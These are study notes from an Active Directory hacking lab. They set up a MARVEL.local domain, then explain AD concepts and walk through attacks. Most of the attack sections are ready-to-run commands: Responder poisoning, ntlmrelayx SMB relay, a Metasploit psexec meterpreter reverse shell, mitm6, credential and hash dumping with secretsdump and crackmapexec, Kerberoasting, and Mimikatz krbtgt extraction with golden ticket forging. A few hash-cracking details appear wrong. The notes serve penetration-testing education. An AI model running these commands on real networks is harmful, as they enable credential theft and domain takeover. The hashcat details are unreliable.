# Active Directory Hacking

## AD Setup

### Windows Server 2019

- **Hostname:** HYDRA-DC
- **User (Domain Admin):** administrator:P@$$w0rd!
- **Static IP Configuration:**
  - Navigate to Control Panel\Network and Internet\Network Connections
  - IPv4 IP: 192.168.31.90
- **Domain Name:** MARVEL.local
- **Active Directory Users and Computers:**
  - Copy Administrator user to create a second domain admin: tstark:<yourpassword>
  - Copy Administrator user to create a service account: SQLService:MYpassword123#
  - Create new users:
    - fcastle:Password1
    - pparker:Password1

### Windows 10 Enterprise

- Set the DNS Server to DC IP: 192.168.31.90
- Log in using MARVEL\administrator:P@$$w0rd!
- Edit Local Users and Groups:
  - Reset password and enable Local Administrator: Password1!
- Add domain users to the Administrators group:
  - THEPUNISHER VM: fcastle
  - SPIDERMAN VM: fcastle, pparker
- Go to Network Settings and turn on Network Discovery & File Sharing

## Physical Components

### Domain Controller

A server with the Active Directory Domain Services (AD DS) server role, specifically promoted to a domain controller.

- Host a copy of the AD DS directory store
- Provide authentication and authorization services
- Replicate updates to other domain controllers
- Allow administrative access to manage user accounts and network resources

### AD DS Data Store

Database files and processes that store and manage directory information for users, services, and apps.

- Contains Ntds.dit file - very important file (contains password hashes, etc) stored in the %SystemRoot%\NTDS folder on all domain controllers.
- Accessible only through the domain controller processes and protocols.

## Logical Components

### Schema

Like a rulebook, defines every type of object that can be stored in the directory, enforces object creation and configuration rules.

- **Class object** - What objects can be created in the directory (user, computer, etc).
- **Attribute object** - Information that can be attached to an object (display name, etc).

### Domains

Used to group and manage objects in an organization.

- Administrative boundary for applying policies to groups of objects.
- Replication boundary for replicating data between domain controllers.
- Authentication and authorization boundary - to limit the scope of access to resources.

### Trees

A hierarchy of domains in AD DS, that can:

- Share a contiguous namespace with the parent domain
- Can have additional child domains
- (By default) create a 2-way transitive trust with other domains

### Forests

A collection of domain trees.

- Forests share common schema, configuration partition, global catalog to enable searching.
- Enable trusts between all domains in the forest
- Share the Enterprise Admins and Schema Admins groups

### Organizational Units (OUs)

AD containers that can contain users, groups, computers, other OUs.

- Represent the organization hierarchically and logically
- Manage a collection of objects in a consistent way
- Delegate permissions to administer groups of objects
- Apply policies

### Trusts

Define relationships between domains, allowing users in one domain to access resources in another.

- All domains in a forest trust all other domains in the forest
- Trusts can extend outside the forest
- **Directional** - The trust direction flows from trusting domain to the trusted domain
- **Transitive** - The trust relationship is extended to include other trusted domains

### Objects

- **User** - Enables network resource access for a user
- **InetOrgPerson** - Used for compatibility with other directory services
- **Contacts** - Used primarily to assign e-mail addresses to external users; no network access
- **Groups** - Used to simplify the administration of access control
- **Computers** - Enable authentication and auditing of computer access to resources
- **Printers** - Simplify the process of locating and connecting to printers
- **Shared folders** - Enables users to search for shared folders based on properties

## AD Attacks

### 1. LLMNR Poisoning (Link-Local Multicast Name Resolution)

- Allows hosts to perform name resolution for hosts on the same local network without requiring a DNS server.
- When a host's DNS query fails, it broadcasts an LLMNR query across the local network.
- An attacker can listen for these queries and respond with its IP to redirect traffic, leading to relay attacks and credentials theft (username & NTLM hash).

**Tools:**

- Responder - LMNR, NBT-NS and MDNS poisoner

**Command:**

```bash
responder -I eth0 -dwv
```

**Steps:**

- Login to THEPUNISHER VM with fcastle user and try to open WinExplorer and navigate to \\10.8.0.2 (Kali IP).
- An event occurs and triggers LLMNR, captured by Responder, which receives the victim's username and password NTLMv2 hash.

### 2. SMB Relay

- Attackers intercept and relay SMB authentication attempts to another server, impersonating the user and exploiting SMB due to lack of SMB signing, gaining unauthorized access.

**Requirements:**

- SMB signing disabled or not enforced
- Relayed user must have local admin credentials
- Credentials cannot be relayed to the same machine

**Check for SMB signing using nmap:**

```bash
nmap --script=smb2-security-mode.nse -p445 192.168.31.90-93 -Pn
```

**Setup:**

- Edit Responder configuration file:

```bash
sudo nano /etc/responder/Responder.conf
# Switch Off SMB and HTTP
SMB = Off
HTTP = Off
```

- Create a targets.txt file with the gathered targets which have SMB signing off.
- Run Responder:

```bash
responder -I eth0 -dwv
```

- Use ntlmrelayx.py to perform SMB Relay attacks:

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```

- Login to THEPUNISHER VM with fcastle user and try to open WinExplorer and navigate to \\10.8.0.2 (Kali IP), triggering LLMNR, captured by Responder, and relayed by ntlmrelayx to targets.
- Bind to the SMB shell:

```bash
nc 127.0.0.1 11000
```

### 3. Gaining Shell Access

**Using Metasploit:**

```bash
msfconsole
search psexec
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
set rhosts <Punisher IP>
set smbdomain MARVEL.local
set smbuser fcastle
set smbpass #Naruhina20
run
```

**Using psexec.py:**

```bash
psexec.py MARVEL.local/fcastle:'#Naruhina20'@192.168.31.93
```

- Similarly, you can use smbexec and wmiexec.

### 4. IPv6 DNS Takeover Attack

- mitm6 exploits the default Windows config to take over the default DNS server by replying to DHCPv6 messages (acts as a legit DHCPv6 server), providing the victim with a link-local IPv6 address and setting the attacker's host as default DNS server.

**Commands:**

```bash
sudo ntlmrelayx.py -6 -t ldaps://hydra-dc.MARVEL.local -wh fakewpad.MARVEL.local -l lootme
```

- Reboot THEPUNISHER VM and check the ntlmrelayx.py output.
- Check lootme directory; it would contain data about domain users, computers, groups, policies, etc.

### 5. Pass-Back Attack

- Involves redirecting MFP's LDAP authentication to a malicious server to capture user credentials.
- MFPs (Multi-Function Peripherals - printers, copiers) are often overlooked targets but can be exploited for serious security breaches.

**Steps:**

- Access the MFP's embedded web interface (EWS) using default or guessed credentials.
- Change the LDAP server address to point to a malicious LDAP server you control.
- When a user tries to scan/email something and logs in, the MFP sends their domain credentials to your fake server.

**Tools:**

- PRET can be used to access MFP settings.

## Post Compromise Enumeration

### 1. PowerView

- Helps attackers map out an Active Directory environment without needing GUI tools.

**Usage:**

- Bypass execution policy:

```powershell
powershell -ep bypass
```

- Load PowerView:

```powershell
. .\PowerView.ps1
```

**Common Commands:**

- `Get-NetDomain` - Gets information about the current domain.
- `Get-NetUser` - Lists all domain users (useful with filters).
- `Get-NetGroup` - Lists all domain groups.
- `Get-NetGroupMember -GroupName "Domain Admins"` - Lists members of the Domain Admins group.
- `Get-NetComputer` - Lists all computers in the domain.
- `Get-NetOU` - Lists all Organizational Units (OUs).
- `Get-UserProperty` - Retrieves specific properties from all users (e.g., description, pwdlastset, etc.).
- `Find-LocalAdminAccess` - Finds computers where the current user has local admin rights.
- `Get-NetSession` - Shows active sessions on target machines.
- `Get-NetLoggedon` - Lists users logged onto a machine.
- `Invoke-ShareFinder` - Finds shared folders on the domain.
- `Get-NetGPO` - Finds all Group policies.

- You can add filters using `| select (parameter)`.

### 2. BloodHound

- BloodHound collects data using SharpHound, the ingestor.

**Steps:**

- On the compromised machine:

```powershell
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName loot.zip
```

- Transfer the zip file to your attack machine.
- Launch neo4j:

```bash
sudo neo4j console
```

- Log in (default Neo4j user/pass is neo4j:neo4j, then change it).
- Drag the loot.zip into the BloodHound GUI to upload.

## Post Compromise Attacks

### I. Pass the Hash

- **crackmapexec** - Post-exploitation tool that helps automate assessing the security of large Active Directory networks. Here you can pass the password or hash:

```bash
crackmapexec smb 192.168.31.0/24 -u fcastle -d MARVEL.local -p Password1
crackmapexec smb 192.168.31.0/24 -u fcastle -p Password1 -d MARVEL.local --sam
```

- **secretsdump.py** - Dump hashes:

```bash
secretsdump.py MARVEL.local/fcastle:'Password1'@spiderman.MARVEL.local
secretsdump.py MARVEL.local/fcastle:'Password1'@thepunisher.MARVEL.local
```

- **Hashcat** - Crack hashes (Note: Only NTLMv2 hashes can be relayed; NTLMv1 cannot).
  - Use `-m 1000` for NTLMv1.

**Mitigations:**

- **Limit Account Reuse**
  - Avoid using the same local admin password across machines.
  - Disable default accounts like Guest and Administrator if not needed.
- **Apply Least Privilege**
  - Only give local admin rights to users who really need them.
- **Use Strong Passwords**
  - Make them long (preferably 14+ characters).
  - Avoid common words — use full sentences or passphrases.
- **Use Privileged Access Management (PAM)**
  - Require check-out/check-in for sensitive accounts.
  - Automatically rotate passwords/hashes after each use.

### II. Token Impersonation

- **Tokens** - Temporary keys that allow access to a system/network without providing credentials each time (like cookies for computers).

**Types:**

- **Delegate** - Created for logging into a machine or remote desktop.
- **Impersonate** - “Non-interactive” such as attaching a network drive or a domain logon script.

**Mitigations:**

- Limit user/group token creation permissions
- Account tiering
- Limit admin restriction

### III. Kerberoasting

**Process:**

1. User (Victim) asks the Domain Controller for a TGT and sends their NTLM hash.
2. Domain Controller sends back a TGT, encrypted with the domain’s secret key.
3. User wants to access an Application Server (like a file server, SQL server, etc).
4. User sends the TGT to the Domain Controller, asking for a TGS (Ticket Granting Service ticket) for that specific service.
5. Domain Controller sends back the TGS, encrypted with the Application Server's account hash.
6. User presents the TGS to the Application Server to access it.

- **SPN** - Service Principal Name, a unique identifier to identify and authenticate a specific service instance.

**Attack:**

```bash
sudo GetUserSPNs.py MARVEL.local/fcastle:'Password1' -dc-ip 192.168.31.90 -request
```

- Copy the krb5tgs hash and crack it using Hashcat.

**Mitigations:**

- Strong Passwords
- Least Privilege

### IV. GPP Password Attack

- Group Policy Preferences allowed admins to create policies using embedded credentials.
- These credentials are encrypted and placed in a “cPassword” in the XML files of SYSVOL.

**Search for cpassword:**

```bash
findstr /S /I cpassword \\marvel.local\sysvol\marvel.local\policies\*.xml
```

- Use gpp-decrypt to crack the GPP hash.

### V. URL File Access

- If you have compromised a machine and the user has any sort of file share access, you can use that access to capture more hashes from different users who access or hover over your URL file.

### VI. Credential Dumping with Mimikatz

**On your attacker Kali machine:**

```bash
mkdir mimikats
cd mimikats
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
# extract zip (you can use unzip or your file manager)
python3 -m http.server 80
```

**On the target Windows machine:**

- Open http://192.168.31.131/mimikatz_trunk/x64/ in the browser and download all 4 files from the x64 directory.
- Run Mimikatz with `privilege::debug`.
- Dump NTDS.dit and crack passwords.

### VII. Golden Ticket Attack using Mimikatz

- After `privilege::debug` command, extract the hash of the krbtgt account:

```bash
lsadump::lsa /inject /name:krbtgt
```

- Note the SID of the domain and NTLM hash of the krbtgt account.
- Generate the golden ticket:

```bash
kerberos::golden /User:MyAdministrator /domain:marvel.local /sid:S-1-5-21-1796002695-2329991732-2223296958 /krbtgt:21a84dbb8f81aa02316606b488a4a9eb /id:500 /ptt
```

- Open a session using `misc::cmd`.
- Now you can access the directories of THEPUNISHER and other machines.
- You can also create an account and make it a domain admin.